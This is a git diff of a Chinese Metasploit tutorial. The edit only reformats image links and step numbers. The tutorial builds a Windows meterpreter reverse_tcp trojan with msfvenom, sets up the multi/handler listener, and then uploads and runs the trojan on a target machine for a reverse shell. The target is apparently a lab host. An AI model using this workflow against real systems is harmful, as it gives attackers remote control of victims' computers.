@@ -14,22 +14,18 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.38 LPORT=4567 -e x
 
 ## 三、配置监控
 
-1. 启动 msf 终端内输入：msfconsole 启动 msf  
-![[1642501758409.png]]
-
+1. 启动 msf 终端内输入：msfconsole 启动 msf
 2. 载入监控模块 msf 中输入： use exploit/multi/handler
-
-   ![[1642501831818.png]]
-
 3. 加载 payload msf 终端中输入：set payload windows/meterpreter/reverse_tcp
 4. 配置 payload msf 终端中输入：show options
 5. 配置 payload 监控 IP msf 终端中输入： set lhost {监控 IP}
 6. 配置 payload 监控端口 msf 终端中输入：set lport {监控端口} （注意这里要和木马配置时使用的端口相同&如果使用内网穿透服务填写转发后的端口）
-7. 检查 payload 配置 msf 终端中输入：show options ![1642501934250](1642501934250.png)
-8. 执行监控 msf 终端中输入： run
+7. 检查 payload 配置 msf 终端中输入：show options
+8. ![](1642501934250.png)
+9. 执行监控 msf 终端中输入： run
 
 ## 四、攻击利用
 
 1. 将木马上传到靶机
 2. 在靶机上执行木马
-3. 完成攻击利用![1642501969373](1642501969373.png)
+3. 完成攻击利用![](1642501969373.png)
